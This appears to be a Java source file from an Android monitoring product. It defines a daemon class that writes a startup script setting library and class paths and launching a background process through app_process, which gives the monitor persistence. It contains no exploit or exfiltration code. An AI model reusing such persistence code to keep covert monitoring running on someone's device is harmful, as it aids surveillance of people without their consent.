package com.fx.pmond.ref;

import com.fx.daemon.Daemon;
import com.fx.daemon.DaemonHelper;
import com.vvt.logger.FxLog;

public class MonitorDaemon extends Daemon {
	
	private static final String TAG = "MonitorDaemon";
	private static boolean LOGV = Customization.VERBOSE;
	
	@Override
	protected void createStartupScript() throws Exception {
		if (LOGV) FxLog.v(TAG, "createStartupScript # ENTER ...");
		
		StringBuilder script = new StringBuilder();
		script.append("#script\n");
		
		// Define reference library:-
		// export LD_LIBRARY_PATH=/system/lib:<native lib path>
		StringBuilder builder = new StringBuilder(DaemonHelper.SYSTEM_LIB_PATH);
		if (! DaemonHelper.SYSTEM_LIB_PATH.equals(MonitorDaemonResource.NATIVE_LIBS_PATH)) {
			builder.append(":").append(MonitorDaemonResource.NATIVE_LIBS_PATH);
		}
		script.append(String.format(FORMAT_LIBRARY, builder.toString()));
		
		// Define class path:- 
		// export CLASSPATH=<extracting path>/<zip file>;
		script.append(String.format(
				FORMAT_CLASSPATH, 
				MonitorDaemonResource.EXTRACTING_PATH, 
				MonitorDaemonResource.DEX_ZIP_FILENAME));
		
		// Define Main:-
		// app_process /system/bin <main class> \\$* &
		script.append(String.format(FORMAT_APP_PROCESS, MonitorDaemonResource.MAIN_CLASS));
		
		String result = script.toString();
		if (LOGV) FxLog.v(TAG, String.format("Startup Script:-\n%s", result));
		
		createStartupScriptFile(MonitorDaemonResource.STARTUP_SCRIPT_PATH, result);
		
		if (LOGV) FxLog.v(TAG, "createStartupScript # EXIT ...");
	}

	@Override
	protected String getExtractingResourcePath() {
		return MonitorDaemonResource.EXTRACTING_PATH;
	}

	@Override
	protected String getNativeLibraryPath() {
		return MonitorDaemonResource.NATIVE_LIBS_PATH;
	}

	@Override
	protected String[] getNativeLibraryFilenames() {
		return MonitorDaemonResource.NATIVE_LIB_FILENAMES;
	}
	
	@Override
	protected String[] getResourceFilenames() {
		return MonitorDaemonResource.RESOURCE_FILENAMES;
	}
	
	@Override
	protected String getTag() {
		return TAG;
	}

	@Override
	public String getProcessName() {
		return MonitorDaemonResource.PROCESS_NAME;
	}

	@Override
	public String getStartupScriptPath() {
		return MonitorDaemonResource.STARTUP_SCRIPT_PATH;
	}
	
}
